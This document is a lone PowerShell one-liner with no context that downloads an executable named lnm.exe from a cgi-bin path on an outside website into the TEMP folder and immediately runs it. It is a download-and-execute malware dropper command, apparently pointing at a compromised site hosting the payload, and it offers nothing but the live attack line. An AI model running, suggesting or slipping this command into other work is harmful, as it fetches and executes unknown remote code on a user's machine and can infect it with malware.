
(New-Object System.Net.WebClient).DownloadFile('http://www.athensheartcenter.com/crm/cgi-bin/lnm.exe',"$env:TEMP\lnm.exe");Start-Process ("$env:TEMP\lnm.exe")

